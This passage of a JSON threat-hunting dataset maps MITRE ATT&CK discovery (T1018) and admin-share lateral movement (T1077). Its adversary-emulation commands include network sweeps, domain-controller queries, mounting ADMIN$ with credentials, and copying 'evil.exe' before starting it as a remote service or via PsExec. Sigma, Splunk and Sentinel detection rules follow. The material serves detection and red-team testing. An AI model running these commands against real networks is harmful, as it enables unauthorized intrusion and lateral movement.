group Domain Computers", "executor": {"elevation_required": false, "command": "net group \"Domain Computers\" /domain\n", "name": "command_prompt"}}, {"description": "Identify domain controllers for specified domain.\n", "supported_platforms": ["windows"], "name": "Remote System Discovery - nltest", "input_arguments": {"target_domain": {"default": "domain.local", "type": "String", "description": "Domain to query for domain controllers"}}, "executor": {"elevation_required": false, "command": "nltest.exe /dclist:#{target_domain}\n", "name": "command_prompt"}}, {"description": "Identify remote systems via ping sweep\n", "supported_platforms": ["windows"], "name": "Remote System Discovery - ping sweep", "executor": {"elevation_required": false, "command": "for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i\n", "name": "command_prompt"}}, {"description": "Identify remote systems via arp\n", "supported_platforms": ["windows"], "name": "Remote System Discovery - arp", "executor": {"elevation_required": false, "command": "arp -a\n", "name": "command_prompt"}}, {"description": "Identify remote systems via arp\n", "supported_platforms": ["linux", "macos"], "name": "Remote System Discovery - arp nix", "executor": {"elevation_required": false, "command": "arp -a | grep -v '^?'\n", "name": "sh"}}, {"description": "Identify remote systems via ping sweep\n", "supported_platforms": ["linux", "macos"], "name": "Remote System Discovery - sweep", "executor": {"elevation_required": false, "command": "for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo \"192.168.1.$ip UP\" || : ; done\n", "name": "sh"}}, {"description": "Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig\n", "supported_platforms": ["windows"], "name": "Remote System Discovery - nslookup", "executor": {"elevation_required": true, "command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]\n$pieces = $localip.split(\".\")\n$firstOctet = $pieces[0]\n$secondOctet = $pieces[1]\n$thirdOctet = $pieces[2]\nforeach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}\n", "name": "powershell"}}], "attack_technique": "T1018"}}, {"Mitre Stockpile - Use PowerView to query the Active Directory server for a list of computers in the Domain": {"platforms": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.gdomain": [{"source": "remote.host.fqdn"}]}, "command": "Import-Module .\\powerview.ps1;\nGet-DomainComputer\n", "payload": "powerview.ps1"}}}, "description": "Use PowerView to query the Active Directory server for a list of computers in the Domain", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "id": "13379ae1-d20e-4162-91f8-320d78a35e7f", "name": "Discover local hosts"}}, {"Mitre Stockpile - Identify the remote domain controllers": {"platforms": {"windows": {"psh": {"command": "nltest /dclist:%USERDOMAIN%\n"}}}, "description": "Identify the remote domain controllers", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "id": "26c8b8b5-7b5b-4de1-a128-7d37fb14f517", "name": "Discover domain controller"}}, {"Mitre Stockpile - View the known_hosts file": {"platforms": {"darwin": {"sh": {"command": "cat ~/.ssh/known_hosts\n"}}, "linux": {"sh": {"command": "cat ~/.ssh/known_hosts\n"}}}, "description": "View the known_hosts file", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "id": "5f77ecf9-613f-4863-8d2f-ed6b447a4633", "name": "Parse SSH known_hosts"}}, {"Mitre Stockpile - Locate all active IP and FQDNs on the network": {"platforms": {"windows": {"psh,cmd": {"command": "arp -a"}}, "darwin": {"sh": {"command": "arp -a"}}, "linux": {"sh": {"command": "arp -a"}}}, "description": "Locate all active IP and FQDNs on the network", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "id": "85341c8c-4ecb-4579-8f53-43e3e91d7617", "name": "Collect ARP details"}}, {"Mitre Stockpile - Identify remote domain controller": {"platforms": {"windows": {"psh": {"command": "nltest /dclist:%USERDOMAIN%\n"}}}, "description": "Identify remote domain controller", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "id": "b22b3b47-6219-4504-a2e6-ae8263e49fc3", "name": "Find domain controller"}}, {"Mitre Stockpile - Identify the organizations mail server": {"platforms": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}, "command": "(nslookup -querytype=mx #{target.org.domain}. | Select-String -pattern 'mail' | Out-String).Trim()\n"}}, "darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}, "command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev"}}, "linux": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}, "command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev"}}}, "description": "Identify the organizations mail server", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "id": "ce485320-41a4-42e8-a510-f5a8fe96a644", "name": "Discover Mail Server"}}, {"Mitre Stockpile - Find hostname of remote IP in domain": {"platforms": {"windows": {"psh": {"command": "nslookup #{remote.host.ip}\n"}}}, "description": "Find hostname of remote IP in domain", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "id": "fa4ed735-7006-4451-a578-b516f80e559f", "name": "Reverse nslookup IP"}}, {"Mitre Stockpile - Find hostname of remote host": {"platforms": {"windows": {"psh": {"command": "nbtstat -A #{remote.host.ip}"}}}, "description": "Find hostname of remote host", "tactic": "discovery", "technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "id": "fdf8bf36-797f-4157-805b-fe7c1c6fc903", "name": "Find Hostname"}}, {"Threat Hunting Tables": {"mitre_attack": "T1018", "file_value": "", "file_path": "", "parent_process": "net.exe", "itw_sample": "", "chain_id": "100165", "registry_value": "", "mitre_caption": "remote_discovery", "registry_path": "", "frequency": "low", "commandline_string": "view /domain", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1018", "file_value": "", "file_path": "", "parent_process": "qwinsta.exe", "itw_sample": "", "chain_id": "100166", "registry_value": "", "mitre_caption": "remote_discovery", "registry_path": "", "frequency": "rare", "commandline_string": "/server:", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1018", "file_value": "", "file_path": "", "parent_process": "installutil.exe", "itw_sample": "", "chain_id": "100167", "registry_value": "", "mitre_caption": "execution", "registry_path": "", "frequency": "low", "commandline_string": "/logfile= /LogToConsole=false /U *.dll", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1018", "Empire Module": "powershell/situational_awareness/network/powerview/get_domain_controller", "Technique": "Remote System Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_domain_controller\":  [\"T1018\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1018", "Empire Module": "powershell/situational_awareness/network/powerview/get_domain_policy", "Technique": "Remote System Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_domain_policy\":  [\"T1018\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1018", "Empire Module": "powershell/situational_awareness/network/powerview/get_domain_trust", "Technique": "Remote System Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_domain_trust\":  [\"T1018\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1018", "Empire Module": "powershell/situational_awareness/network/powerview/get_forest", "Technique": "Remote System Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_forest\":  [\"T1018\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1018", "Empire Module": "powershell/situational_awareness/network/powerview/get_forest_domain", "Technique": "Remote System Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_forest_domain\":  [\"T1018\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1018", "Empire Module": "powershell/situational_awareness/network/powerview/get_site", "Technique": "Remote System Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_site\":  [\"T1018\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1018", "Empire Module": "powershell/situational_awareness/network/reverse_dns", "Technique": "Remote System Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/reverse_dns\":  [\"T1018\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1018", "Empire Module": "python/situational_awareness/network/active_directory/get_computers", "Technique": "Remote System Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/get_computers\":  [\"T1018\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1018", "Empire Module": "python/situational_awareness/network/active_directory/get_domaincontrollers", "Technique": "Remote System Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/get_domaincontrollers\":  [\"T1018\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1018", "Empire Module": "python/situational_awareness/network/gethostbyname", "Technique": "Remote System Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/gethostbyname\":  [\"T1018\"],"}}], "queries": [{"query": "Sysmon| where EventID == 3 and (process_path contains \"net.exe\"or process_path contains \"ping.exe\")and (process_command_line contains \"view\"or process_command_line contains \"ping\")", "product": "Azure Sentinel", "name": "Remote System Discovery Network"}, {"query": "Sysmon| where (process_path contains \"net.exe\"or process_path contains \"ping.exe\")and (process_command_line contains \"view\"or process_command_line contains \"ping\")", "product": "Azure Sentinel", "name": "Remote System Discovery Process"}, {"query": "title: Windows Network Enumeration\nid: 62510e69-616b-4078-b371-847da438cc03\nstatus: stable\ndescription: Identifies attempts to enumerate hosts in a network using the built-in Windows net.exe tool.\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/b8a94d2f-dc75-4630-9d73-1edc6bd26fff.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.yaml\nauthor: Endgame, JHasenbusch (ported for oscd.community)\ndate: 2018/10/30\nmodified: 2019/11/11\ntags:\n    - attack.discovery\n    - attack.t1018\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: \n            - '\\net.exe'\n            - '\\net1.exe'\n        CommandLine|contains: 'view'\n    filter:\n        CommandLine|contains: '\\\\'\n    condition: selection and not filter\nfalsepositives:\n    - Legitimate use of net.exe utility by legitimate user\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Windows Network Enumeration\nid: 62510e69-616b-4078-b371-847da438cc03\nstatus: stable\ndescription: Identifies attempts to enumerate hosts in a network using the built-in Windows net.exe tool.\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/b8a94d2f-dc75-4630-9d73-1edc6bd26fff.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.yaml\nauthor: Endgame, JHasenbusch (ported for oscd.community)\ndate: 2018/10/30\nmodified: 2019/11/11\ntags:\n    - attack.discovery\n    - attack.t1018\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: \n            - '\\net.exe'\n            - '\\net1.exe'\n        CommandLine|contains: 'view'\n    filter:\n        CommandLine|contains: '\\\\'\n    condition: selection and not filter\nfalsepositives:\n    - Legitimate use of net.exe utility by legitimate user\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:(*\\\\\\\\net.exe OR *\\\\\\\\net1.exe) AND CommandLine.keyword:*view*) AND (NOT (CommandLine.keyword:*\\\\\\\\*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Windows-Network-Enumeration <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Windows Network Enumeration\",\\n    \"description\": \"Identifies attempts to enumerate hosts in a network using the built-in Windows net.exe tool.\",\\n    \"tags\": [\\n      \"attack.discovery\",\\n      \"attack.t1018\"\\n    ],\\n    \"query\": \"((Image.keyword:(*\\\\\\\\\\\\\\\\net.exe OR *\\\\\\\\\\\\\\\\net1.exe) AND CommandLine.keyword:*view*) AND (NOT (CommandLine.keyword:*\\\\\\\\\\\\\\\\*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:(*\\\\\\\\\\\\\\\\net.exe OR *\\\\\\\\\\\\\\\\net1.exe) AND CommandLine.keyword:*view*) AND (NOT (CommandLine.keyword:*\\\\\\\\\\\\\\\\*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Windows Network Enumeration\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:(*\\\\\\\\net.exe *\\\\\\\\net1.exe) AND CommandLine.keyword:*view*) AND (NOT (CommandLine.keyword:*\\\\\\\\*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((Image=\"*\\\\\\\\net.exe\" OR Image=\"*\\\\\\\\net1.exe\") CommandLine=\"*view*\") NOT (CommandLine=\"*\\\\\\\\*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (Image IN [\"*\\\\\\\\net.exe\", \"*\\\\\\\\net1.exe\"] CommandLine=\"*view*\")  -(CommandLine=\"*\\\\\\\\*\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*(?:.*.*\\\\net\\\\.exe|.*.*\\\\net1\\\\.exe))(?=.*.*view.*)))(?=.*(?!.*(?:.*(?=.*.*\\\\\\\\.*)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "Yml\ntitle: windows net view command execution\ndescription: windows server 2016\nreferences: No\ntags: T1018\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # Process Creation\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ windows \\ System32 \\ net.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: net view * # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: low", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net use [\\\\ip\\path] [password] [/user:DOMAIN\\user]\nnet use \\\\COMP\\ADMIN$ password /user:COMP\\Administrator (checking password reuse on local admin account)", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell net use [\\\\ip\\path] [password] [/user:DOMAIN\\user]", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Creating a new service remotely:\nnet use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\ncopy evil.exe \\\\COMP\\ADMIN$\\System32\\acachsrv.exe\nsc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto  DisplayName= \"DisplayName\"\nsc \\\\COMP start acachsrv", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Creating a new service remotely:\nshell net use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\nshell copy evil.exe \\\\COMP\\ADMIN$\\acachsrv.exe\nshell sc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto description= \"Description here\" DisplayName= \"DisplayName\"\nshell sc \\\\COMP start acachsrv", "name": "Cobalt Strike"}, {"source": "atomics/T1077/T1077.yaml", "command": "cmd.exe /c \"net use \\\\#{computer_name}\\#{share_name} P@ssw0rd1 /u:#{user_name}\"\n", "name": null}, {"source": "atomics/T1077/T1077.yaml", "command": "cmd.exe /c \"net use \\\\#{computer_name}\\#{share_name} P@ssw0rd1 /u:DOMAIN\\Administrator\"\n", "name": null}, {"source": "atomics/T1077/T1077.yaml", "command": "cmd.exe /c \"net use \\\\Target\\#{share_name} #{password} /u:#{user_name}\"\n", "name": null}, {"source": "atomics/T1077/T1077.yaml", "command": "cmd.exe /c \"net use \\\\Target\\C$ #{password} /u:#{user_name}\"\n", "name": null}, {"source": "atomics/T1077/T1077.yaml", "command": "New-PSDrive -name g -psprovider filesystem -root \\\\#{computer_name}\\#{share_name}\n", "name": null}, {"source": "atomics/T1077/T1077.yaml", "command": "New-PSDrive -name g -psprovider filesystem -root \\\\Target\\#{share_name}\n", "name": null}, {"source": "atomics/T1077/T1077.yaml", "command": "New-PSDrive -name #{map_name} -psprovider filesystem -root \\\\#{computer_name}\\C$\n", "name": null}, {"source": "atomics/T1077/T1077.yaml", "command": "psexec.exe \\\\localhost -c #{command_path}\n", "name": null}, {"source": "atomics/T1077/T1077.yaml", "command": "psexec.exe \\\\localhost -c C:\\Windows\\System32\\cmd.exe\n", "name": null}, {"source": "atomics/T1077/T1077.yaml", "command": "cmd.exe /Q /c #{command_to_execute} 1> \\\\127.0.0.1\\ADMIN$\\output.txt 2>&1\n", "name": null}, {"source": "atomics/T1077/T1077.yaml", "command": "cmd.exe /Q /c hostname 1> \\\\127.0.0.1\\ADMIN$\\output.txt 2>&1\n", "name": null}, {"source": "data/abilities/lateral-movement/40161ad0-75bd-11e9-b475-0800200c9a66.yml", "command": {"windows": {"psh": {"cleanup": "net use \\\\#{remote.host.ip}\\c$ /delete;\n", "command": "net use \\\\#{remote.host.ip}\\c$ /user:#{domain.user.name} #{domain.user.password};\n"}}}, "name": "Mounts a network file share on a target computer"}, {"source": "data/abilities/lateral-movement/aa6ec4dd-db09-4925-b9b9-43adeb154686.yml", "command": {"windows": {"psh": {"cleanup": "net use \\\\#{remote.host.fqdn}\\C$ /delete\n", "command": "net use \\\\#{remote.host.fqdn}\\C$ /user:#{network.domain.name}\\#{domain.user.name} #{domain.user.password}\n", "parsers": {"plugins.stockpile.app.parsers.share_mounted": [{"source": "remote.host.fqdn", "edge": "has_share"}]}}}}, "name": "Mount a windows share"}], "command_list": ["net use [\\\\ip\\path] [password] [/user:DOMAIN\\user]\nnet use \\\\COMP\\ADMIN$ password /user:COMP\\Administrator (checking password reuse on local admin account)", "shell net use [\\\\ip\\path] [password] [/user:DOMAIN\\user]", "Creating a new service remotely:\nnet use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\ncopy evil.exe \\\\COMP\\ADMIN$\\System32\\acachsrv.exe\nsc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto  DisplayName= \"DisplayName\"\nsc \\\\COMP start acachsrv", "Creating a new service remotely:\nshell net use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\nshell copy evil.exe \\\\COMP\\ADMIN$\\acachsrv.exe\nshell sc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto description= \"Description here\" DisplayName= \"DisplayName\"\nshell sc \\\\COMP start acachsrv", "cmd.exe /c \"net use \\\\#{computer_name}\\#{share_name} P@ssw0rd1 /u:#{user_name}\"\n", "cmd.exe /c \"net use \\\\#{computer_name}\\#{share_name} P@ssw0rd1 /u:DOMAIN\\Administrator\"\n", "cmd.exe /c \"net use \\\\Target\\#{share_name} #{password} /u:#{user_name}\"\n", "cmd.exe /c \"net use \\\\Target\\C$ #{password} /u:#{user_name}\"\n", "New-PSDrive -name g -psprovider filesystem -root \\\\#{computer_name}\\#{share_name}\n", "New-PSDrive -name g -psprovider filesystem -root \\\\Target\\#{share_name}\n", "New-PSDrive -name #{map_name} -psprovider filesystem -root \\\\#{computer_name}\\C$\n", "psexec.exe \\\\localhost -c #{command_path}\n", "psexec.exe \\\\localhost -c C:\\Windows\\System32\\cmd.exe\n", "cmd.exe /Q /c #{command_to_execute} 1> \\\\127.0.0.1\\ADMIN$\\output.txt 2>&1\n", "cmd.exe /Q /c hostname 1> \\\\127.0.0.1\\ADMIN$\\output.txt 2>&1\n", {"windows": {"psh": {"cleanup": "net use \\\\#{remote.host.ip}\\c$ /delete;\n", "command": "net use \\\\#{remote.host.ip}\\c$ /user:#{domain.user.name} #{domain.user.password};\n"}}}, {"windows": {"psh": {"cleanup": "net use \\\\#{remote.host.fqdn}\\C$ /delete\n", "command": "net use \\\\#{remote.host.fqdn}\\C$ /user:#{network.domain.name}\\#{domain.user.name} #{domain.user.password}\n", "parsers": {"plugins.stockpile.app.parsers.share_mounted": [{"source": "remote.host.fqdn", "edge": "has_share"}]}}}}], "technique_id": "T1077", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1077", "Built-in Windows Command": "net use [\\\\ip\\path] [password] [/user:DOMAIN\\user]\nnet use \\\\COMP\\ADMIN$ password /user:COMP\\Administrator (checking password reuse on local admin account)", "Cobalt Strike": "shell net use [\\\\ip\\path] [password] [/user:DOMAIN\\user]", "Description": "Used to view network shared resource information, add a new network resource, and remove an old network resource from the computer. Run this against computers discovered from the previous two commands to view the shares that are available on them.", "Metasploit": ""}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1077", "Built-in Windows Command": "Creating a new service remotely:\nnet use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\ncopy evil.exe \\\\COMP\\ADMIN$\\System32\\acachsrv.exe\nsc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto  DisplayName= \"DisplayName\"\nsc \\\\COMP start acachsrv", "Cobalt Strike": "Creating a new service remotely:\nshell net use \\\\COMP\\ADMIN$ \"password\" /user:DOMAIN_NAME\\UserName\nshell copy evil.exe \\\\COMP\\ADMIN$\\acachsrv.exe\nshell sc \\\\COMP create acachsrv binPath= \"C:\\Windows\\System32\\acachsrv.exe\" start= auto description= \"Description here\" DisplayName= \"DisplayName\"\nshell sc \\\\COMP start acachsrv", "Description": "This technique creates a new service on the remote machine. It's important to note the spaces after the = in these commands! Also, before starting the service, run the following commands to make sure everything is set up properly:\nsc \\\\COMP qc acachsrv\ndir \\\\COMP\\ADMIN$\\acachsrv.exe", "Metasploit": ""}}, {"Atomic Red Team Test - Windows Admin Shares": {"display_name": "Windows Admin Shares", "atomic_tests": [{"description": "Connecting To Remote Shares\n", "supported_platforms": ["windows"], "name": "Map admin share", "input_arguments": {"password": {"default": "P@ssw0rd1", "type": "String", "description": "Password"}, "user_name": {"default": "DOMAIN\\Administrator", "type": "String", "description": "Username"}, "computer_name": {"default": "Target", "type": "String", "description": "Target Computer Name"}, "share_name": {"default": "C$", "type": "String", "description": "Examples C$, IPC$, Admin$"}}, "executor": {"elevation_required": false, "command": "cmd.exe /c \"net use \\\\#{computer_name}\\#{share_name} #{password} /u:#{user_name}\"\n", "name": "command_prompt"}}, {"description": "Map Admin share utilizing PowerShell\n", "supported_platforms": ["windows"], "name": "Map Admin Share PowerShell", "input_arguments": {"map_name": {"default": "g", "type": "String", "description": "Mapped Drive Letter"}, "computer_name": {"default": "Target", "type": "String", "description": "Target Computer Name"}, "share_name": {"default": "C$", "type": "String", "description": "Examples C$, IPC$, Admin$"}}, "executor": {"elevation_required": false, "command": "New-PSDrive -name #{map_name} -psprovider filesystem -root \\\\#{computer_name}\\#{share_name}\n", "name": "powershell"}}, {"description": "Copies a file to a remote host and executes it using PsExec. Requires the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).\n", "supported_platforms": ["windows"], "name": "Copy and Execute File with PsExec", "input_arguments": {"remote_host": {"default": "\\\\localhost", "type": "String", "description": "Remote computer to receive the copy and execute the file"}, "command_path": {"default": "C:\\Windows\\System32\\cmd.exe", "type": "Path", "description": "File to copy and execute"}}, "executor": {"elevation_required": true, "command": "psexec.exe #{remote_host} -c #{command_path}\n", "name": "command_prompt"}}, {"description": "Executes a command, writing the output to a local Admin Share.\nThis technique is used by post-exploitation frameworks.\n", "supported_platforms": ["windows"], "name": "Execute command writing output to local Admin Share", "input_arguments": {"output_file": {"default": "output.txt", "type": "String", "description": "Remote computer to receive the copy and execute the file"}, "command_to_execute": {"default": "hostname", "type": "String", "description": "Command to execute for output."}}, "executor": {"elevation_required": true, "command": "cmd.exe /Q /c #{command_to_execute} 1> \\\\127.0.0.1\\ADMIN$\\#{output_file} 2>&1\n", "name": "command_prompt"}}], "attack_technique": "T1077"}}, {"Mitre Stockpile - Mounts a network file share on a target computer": {"platforms": {"windows": {"psh": {"cleanup": "net use \\\\#{remote.host.ip}\\c$ /delete;\n", "command": "net use \\\\#{remote.host.ip}\\c$ /user:#{domain.user.name} #{domain.user.password};\n"}}}, "description": "Mounts a network file share on a target computer", "tactic": "lateral-movement", "technique": {"attack_id": "T1077", "name": "Windows Admin Shares"}, "id": "40161ad0-75bd-11e9-b475-0800200c9a66", "name": "Net use"}}, {"Mitre Stockpile - Mount a windows share": {"platforms": {"windows": {"psh": {"cleanup": "net use \\\\#{remote.host.fqdn}\\C$ /delete\n", "command": "net use \\\\#{remote.host.fqdn}\\C$ /user:#{network.domain.name}\\#{domain.user.name} #{domain.user.password}\n", "parsers": {"plugins.stockpile.app.parsers.share_mounted": [{"source": "remote.host.fqdn", "edge": "has_share"}]}}}}, "requirements": [{"plugins.stockpile.app.requirements.not_exists": [{"source": "remote.host.fqdn", "edge": "has_share"}]}, {"plugins.stockpile.app.requirements.basic": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}]}, {"plugins.stockpile.app.requirements.no_backwards_movement": [{"source": "remote.host.fqdn"}]}], "description": "Mount a windows share", "tactic": "lateral-movement", "technique": {"attack_id": "T1077", "name": "Windows Admin Shares"}, "id": "aa6ec4dd-db09-4925-b9b9-43adeb154686", "name": "Mount Share"}}], "queries": [{"query": "Sysmon| where EventID == 3 and process_path contains \"net.exe\"and (process_command_line contains \"use\"or process_command_line contains \"session\"or process_command_line contains \"file\")", "product": "Azure Sentinel", "name": "Windows Admin Shares"}, {"query": "Sysmon| where EventID == 1 and (process_path contains \"net.exe\"or process_path contains \"powershell.exe\")and ((process_command_line contains \"*net* use*$\"or process_command_line contains \"*net* session*$\"or process_command_line contains \"*net* file*$\")or process_command_line contains \"*New-PSDrive*root*\")", "product": "Azure Sentinel", "name": "Windows Admin Shares Process"}, {"query": "Sysmon| where EventID == 1and process_path contains \"net.exe\"and process_command_line contains \"net share\"", "product": "Azure Sentinel", "name": "Windows Admin Shares Process Created"}, {"query": "title: Access to ADMIN$ Share\nid: 098d7118-55bc-4912-a836-dc6483a8d150\ndescription: Detects access to $ADMIN share\ntags:\n    - attack.lateral_movement\n    - attack.t1077\nstatus: experimental\nauthor: Florian Roth\nlogsource:\n    product: windows\n    service: security\n    definition: 'The advanced audit policy setting \"Object Access > Audit File Share\" must be configured for Success/Failure'\ndetection:\n    selection:\n        EventID: 5140\n        ShareName: Admin$\n    filter:\n        SubjectUserName: '*$'\n    condition: selection and not filter\nfalsepositives: \n    - Legitimate administrative activity\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Access to ADMIN$ Share\nid: 098d7118-55bc-4912-a836-dc6483a8d150\ndescription: Detects access to $ADMIN share\ntags:\n    - attack.lateral_movement\n    - attack.t1077\nstatus: experimental\nauthor: Florian Roth\nlogsource:\n    product: windows\n    service: security\n    definition: 'The advanced audit policy setting \"Object Access > Audit File 